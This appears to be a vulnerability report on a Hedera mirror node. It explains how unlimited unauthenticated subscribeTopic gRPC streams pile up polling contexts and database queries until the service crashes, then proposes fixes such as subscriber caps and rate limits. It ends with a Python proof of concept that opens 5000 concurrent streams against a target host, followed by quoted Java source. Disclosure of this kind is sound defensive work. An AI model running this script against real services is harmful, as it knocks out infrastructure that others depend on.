### Title
Unbounded Concurrent Subscriber Accumulation in `PollingTopicListener` Causes OOM-Based DoS

### Summary
`PollingTopicListener.listen()` creates a new `PollingContext` object and an independent reactive polling pipeline for every incoming `subscribeTopic` gRPC call, with no per-user, per-IP, or global subscriber cap enforced anywhere in the call chain. An unauthenticated attacker can open thousands of concurrent streams, exhausting JVM heap memory through accumulated `PollingContext` instances and reactive pipeline state, and simultaneously saturating the database connection pool through independent per-subscriber polling loops, crashing the mirror node service.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` ( [1](#0-0) ) accepts every incoming gRPC call unconditionally and calls `topicMessageService.subscribeTopic()` which ultimately delegates to `TopicListener.listen()`. No authentication, no rate limiting, no concurrent-subscriber check exists at this layer.

`PollingTopicListener.listen()` ( [2](#0-1) ) allocates a fresh `PollingContext` on every invocation:

```java
PollingContext context = new PollingContext(filter);   // line 35 — new object per subscriber
```

and wires it into an infinite polling loop:

```java
return Flux.defer(() -> poll(context))
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)   // line 40 — runs forever
                .withFixedDelay(interval)
                ...
```

Each `PollingContext` holds a `TopicMessageFilter`, an `AtomicLong`, and an `AtomicReference<TopicMessage>`, plus the full Reactor operator chain (defer, repeatWhen, tap, doOnNext, doOnSubscribe). [3](#0-2) 

**Root cause — failed assumption:** The design assumes an external infrastructure layer (load balancer, API gateway) will cap concurrent connections before they reach the application. No application-level guard exists. `ListenerProperties` exposes `maxBufferSize`, `maxPageSize`, `interval`, and `prefetch`, but has no `maxSubscribers` field. [4](#0-3)  `GrpcProperties` similarly has no subscriber cap. [5](#0-4) 

**Why existing checks fail:**
- `Schedulers.boundedElastic()` caps *threads*, not reactive subscriptions. Thousands of `PollingContext` objects and their operator chains live on the heap independently of thread count.
- The `interval` (default 500 ms) only throttles polling frequency per subscriber; it does not limit how many subscribers exist.
- `maxPageSize` (default 5000) limits rows per query but multiplies the DB load linearly with subscriber count.

### Impact Explanation

With the `POLL` listener type active, N concurrent subscribers each independently execute a DB query every 500 ms. At N = 10,000 subscribers: 20,000 DB queries/second, each returning up to 5,000 rows. Simultaneously, 10,000 `PollingContext` objects plus their Reactor operator chains accumulate on the heap. Either the JVM OOMs or the database connection pool is exhausted, both resulting in a complete service crash. The `POLL` type is a supported, documented configuration option (`ListenerType.POLL`). [6](#0-5) 

### Likelihood Explanation

No authentication is required to call `subscribeTopic`. A single attacker machine can open thousands of HTTP/2 streams (gRPC multiplexes over HTTP/2) over a small number of TCP connections, bypassing naive connection-count limits. The attack is trivially scriptable with any gRPC client library and is repeatable indefinitely. The only prerequisite is network access to the gRPC port.

### Recommendation

1. **Add a global subscriber counter** in `PollingTopicListener` using an `AtomicInteger`; reject `listen()` calls that exceed a configurable `maxSubscribers` limit with a `RESOURCE_EXHAUSTED` gRPC status.
2. **Expose `maxSubscribers` in `ListenerProperties`** with a sensible default (e.g., 500) and `@Max` validation.
3. **Add per-IP rate limiting** at the `ConsensusController` layer using a token-bucket or sliding-window counter before delegating to the service.
4. **Configure Netty `maxConnectionAge` and `maxConcurrentCallsPerConnection`** in `NettyProperties` as a defense-in-depth measure.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

TARGET = "mirror-node-grpc:5600"
NUM_STREAMS = 5000

def open_stream():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    request = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1)
    )
    # Block indefinitely, keeping the subscription alive
    for _ in stub.subscribeTopic(request):
        pass

threads = [threading.Thread(target=open_stream) for _ in range(NUM_STREAMS)]
for t in threads:
    t.start()
# Each thread holds a live gRPC stream; mirror node allocates NUM_STREAMS
# PollingContext objects + reactive pipelines + DB polling loops.
# Monitor mirror node JVM heap and DB connection pool — both exhaust within minutes.
```

    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));

    @Data
    private class PollingContext {

        private final TopicMessageFilter filter;
        private final AtomicLong count = new AtomicLong(0L);
        private final AtomicReference<@Nullable TopicMessage> last = new AtomicReference<>();

        void onNext(TopicMessage topicMessage) {
            last.set(topicMessage);
            count.incrementAndGet();
        }

        private @Nullable TopicMessage getLast() {
            return last.get();
        }
    }
